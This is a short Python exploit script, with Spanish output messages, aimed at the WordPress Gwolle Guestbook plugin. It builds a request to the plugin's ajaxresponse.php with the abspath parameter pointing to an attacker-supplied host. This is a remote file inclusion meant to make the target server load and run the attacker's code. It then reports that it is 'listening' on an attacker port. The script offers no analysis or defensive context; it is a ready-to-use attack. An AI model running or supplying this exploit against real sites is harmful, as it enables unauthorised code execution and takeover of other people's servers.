import requests
import sys

def exploit(target_url, attacker_host, attacker_port):
    vulnerable_url = f"{target_url}/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://{attacker_host}/"
    response = requests.get(vulnerable_url)

    if response.status_code == 200:
        print(f"Exploit enviado exitosamente. Escuchando en {attacker_host}:{attacker_port}")
    else:
        print("Error al enviar el exploit. CÃ³digo de estado:", response.status_code)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Uso: {sys.argv[0]} <URL_del_objetivo> <Host_del_atacante> <Puerto_del_atacante>")
        sys.exit(1)

    target_url = sys.argv[1]
    attacker_host = sys.argv[2]
    attacker_port = sys.argv[3]

    exploit(target_url, attacker_host, attacker_port)
